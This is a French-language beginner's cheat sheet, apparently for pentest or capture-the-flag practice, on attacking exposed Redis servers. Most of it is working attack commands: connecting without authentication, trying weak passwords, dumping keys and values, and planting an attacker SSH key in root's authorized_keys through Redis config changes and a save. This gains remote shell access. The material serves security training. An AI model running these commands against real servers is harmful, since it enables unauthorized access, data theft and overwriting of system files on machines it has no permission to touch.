# Exploitation Redis

## Objectif
Exploiter des faiblesses de configuration ou des mots de passe faibles pour obtenir un accès non autorisé à un serveur Redis ou exécuter du code à distance.

---

## Explications vulgarisées
- Redis est une base de données clé-valeur en mémoire, souvent utilisée sans authentification ni restriction réseau. Cela peut permettre un accès complet ou l'exécution de commandes sur la machine.

---

## Commandes et étapes essentielles

### 1. Connexion sans mot de passe
```bash
redis-cli -h target.com
```
- **redis-cli** : Client en ligne de commande pour Redis.
- **Astuce débutant** : Tester la connexion sans mot de passe, puis avec des mots de passe faibles ("redis", "password").

### 2. Enumération et extraction de données
```bash
redis-cli -h target.com keys *
redis-cli -h target.com get flag
```
- **keys *** : Liste toutes les clés présentes.
- **get flag** : Récupère la valeur d'une clé.

### 3. Exploitation pour obtenir un shell (écriture de clé SSH)
- Écrire une clé SSH dans le fichier authorized_keys de l'utilisateur root (si le serveur tourne en root) :
```bash
echo -e "\n\nssh-rsa AAAA... attacker@kali\n\n" > pubkey.txt
cat pubkey.txt | redis-cli -h target.com -x set crackit
redis-cli -h target.com config set dir /root/.ssh/
redis-cli -h target.com config set dbfilename "authorized_keys"
redis-cli -h target.com save
```
- **À surveiller** : Possibilité d'écrire dans des dossiers sensibles, obtention d'un accès SSH.

### 4. Exploitation automatisée avec Nmap
```bash
nmap -p 6379 --script redis-info target.com
```
- **redis-info** : Récupère des infos sur le serveur Redis.

---

## Conseils pour débutants
- Toujours tester la connexion sans mot de passe avant d'essayer des credentials.
- Attention à l'impact de la commande "save" (peut écraser des données existantes).
- Lire la documentation de chaque outil pour découvrir des options avancées.

---

## Pour aller plus loin
- [PayloadsAllTheThings - Redis Exploitation](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Redis%20Methodology)
- [Nmap Redis NSE Scripts](https://nmap.org/nsedoc/categories/redis.html) 